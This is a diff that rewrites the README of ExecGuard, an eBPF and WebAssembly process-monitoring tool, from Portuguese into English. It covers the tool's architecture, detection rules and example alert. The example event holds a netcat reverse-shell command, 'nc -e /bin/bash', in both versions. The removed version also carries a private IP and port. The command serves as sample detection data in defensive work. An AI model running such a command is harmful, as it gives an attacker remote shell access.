@@ -1,168 +1,66 @@
 ExecGuard
 
-Runtime Security Pipeline combinando eBPF para observabilidade kernel-level e WebAssembly (WASM) para execução segura de políticas em tempo real.
+Runtime security pipeline using eBPF telemetry and WebAssembly policy execution.
 
-Visão Geral
+ExecGuard is an experimental security platform that captures Linux process execution events through eBPF and evaluates them inside sandboxed WebAssembly modules.
 
-ExecGuard demonstra uma arquitetura moderna para detecção de comportamento suspeito em sistemas Linux.
+The architecture separates event collection from policy execution, allowing security rules to be updated independently from the kernel instrumentation layer.
 
-O pipeline captura eventos de execução de processos através de eBPF, processa os eventos em userspace utilizando Rust e aplica políticas de segurança isoladas em módulos WebAssembly.
-
-Objetivos
-Captura de eventos execve em nível de kernel
-Pipeline extensível baseado em WASM
-Isolamento seguro das regras de detecção
-Baixa latência por evento
-Hot-swap de políticas sem recompilar o agente
-Arquitetura
-┌────────────────────┐
-│     Linux Kernel   │
-│     Tracepoints    │
-└─────────┬──────────┘
-          │
-          ▼
-┌────────────────────┐
-│     eBPF Probe     │
-│       (Aya)        │
-└─────────┬──────────┘
-          │
-          ▼
-┌────────────────────┐
-│   Rust Loader      │
-│ Async Event Stream │
-└─────────┬──────────┘
-          │
-          ▼
-┌────────────────────┐
-│   WASM Runtime     │
-│    (Wasmtime)      │
-└─────────┬──────────┘
-          │
-          ▼
-┌────────────────────┐
-│ Policy Evaluation  │
-│ Risk Scoring       │
-│ Correlation        │
-└─────────┬──────────┘
-          │
-          ▼
-┌────────────────────┐
-│ JSON Alerts        │
-│ Security Events    │
-└────────────────────┘
-Componentes
+Architecture
+Features
+eBPF-based process monitoring
+Sandboxed policy execution with WASM
+Runtime risk scoring
+JSON security events
+Async Rust pipeline
+Hot-swappable policy layer
+Repository Structure
 execguard/
+├── execguard-ebpf/
 ├── execguard-agent/
-│   ├── src/
-│   └── execguard.wasm
-│
 ├── execguard-wasm/
-│   └── src/
-│
-├── execguard-ebpf-real/
-│   ├── execguard-ebpf/
-│   ├── execguard-common/
-│   └── src/
-│
 ├── scripts/
-│   ├── build.sh
-│   └── test.sh
-│
 └── docs/
-    └── LIMITACAO_WSL.md
-Pipeline de Processamento
-Event
-  │
-  ▼
-Enrichment
-  │
-  ▼
-Correlation
-  │
-  ▼
-Policy Evaluation
-  │
-  ▼
-Risk Scoring
-  │
-  ▼
-Alert Generation
-Regras Implementadas
-Regra	Severidade	Descrição
-BANNED_BINARY	10	Execução de binários proibidos
-TMP_EXECUTION	7	Execução em /tmp
-COMM_MISMATCH	5	Processo difere do executável
-REVERSE_SHELL	9	Indicadores de shell reversa
-Exemplo de Evento
+Detection Rules
+Rule	Description
+BANNED_BINARY	Blacklisted executable
+TMP_EXECUTION	Execution from /tmp
+COMM_MISMATCH	Process name mismatch
+REVERSE_SHELL	Reverse shell indicators
+Example Event
 {
   "pid": 1234,
   "uid": 1000,
   "comm": "bash",
-  "file": "/tmp/nc -e /bin/bash 192.168.1.100 4444",
+  "file": "/tmp/nc -e /bin/bash",
   "risk_score": 10
 }
 Performance
-Métrica	Valor
-Latência WASM	50–130 µs
-Throughput	> 10k eventos/s
-Heap WASM	64 KB
-Binário WASM	~15 KB
-Stack Tecnológica
-Tecnologia	Papel
-Rust	Runtime principal
-eBPF	Captura kernel-level
-Aya	Framework eBPF
-WebAssembly	Sandbox de políticas
-Wasmtime	Runtime WASM
-Tokio	Processamento assíncrono
-Serde	Serialização
-Quick Start
-Build
-git clone https://github.com/seu-usuario/execguard.git
-
-cd execguard
-
-./scripts/build.sh
-Executar Simulação
-cd execguard-agent
-
-cargo run --release
-Status do Projeto
-Componente	Status
-WASM Policy Engine	✅
-Runtime Wasmtime	✅
+Metric	Value
+WASM latency	50-130 µs
+Estimated throughput	>10k events/s
+WASM memory	64 KB
+WASM binary size	~15 KB
+Current Status
+Component	Status
+WASM Engine	✅
 Event Simulation	✅
-eBPF Probe Build	✅
-Aya Loader Build	✅
-Pipeline eBPF → WASM	⚠️ Linux Nativo
-Produção Linux	🔄
-Limitações Conhecidas
+Aya Loader	✅
+eBPF Compilation	✅
+Native Linux Validation	Pending
+Limitations
 
-O ambiente WSL2 não fornece suporte completo para tracepoints e recursos necessários ao runtime eBPF.
+Full eBPF execution requires a native Linux kernel.
 
-O projeto foi validado em modo de simulação e requer Linux nativo para execução completa do pipeline kernel → userspace → WASM.
+WSL2 is supported for development and compilation but does not provide all kernel capabilities required for runtime validation.
 
-Detalhes em:
-
-docs/LIMITACAO_WSL.md
 Roadmap
-Runtime
- Pipeline eBPF → WASM completo
- Hot Reload de módulos WASM
- Policy Registry
-Correlação
- RocksDB State Store
- Correlation Engine
- Session Tracking
-Observabilidade
- Prometheus Metrics
- OpenTelemetry
- Grafana Dashboards
-Segurança
- Threat Intelligence Feeds
- IOC Matching
- YARA Integration
-Licença
+Native Linux validation
+Stateful correlation engine
+RocksDB-backed storage
+Hot reload of WASM modules
+Prometheus metrics
+OpenTelemetry integration
+License
 
 MIT
-
